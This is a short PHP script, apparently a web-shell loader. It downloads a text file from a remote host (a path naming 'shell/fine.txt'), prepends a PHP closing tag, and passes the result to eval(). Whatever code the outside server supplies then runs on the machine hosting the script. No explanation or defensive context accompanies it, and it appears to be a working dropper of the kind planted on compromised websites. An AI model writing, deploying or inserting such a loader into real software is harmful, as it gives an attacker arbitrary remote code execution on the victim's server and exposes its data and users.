 <?php

$content = file_get_contents(urldecode('https://fifutravel.com/repositori/shell/fine.txt'));

$content = "?> ".$content;
eval($content);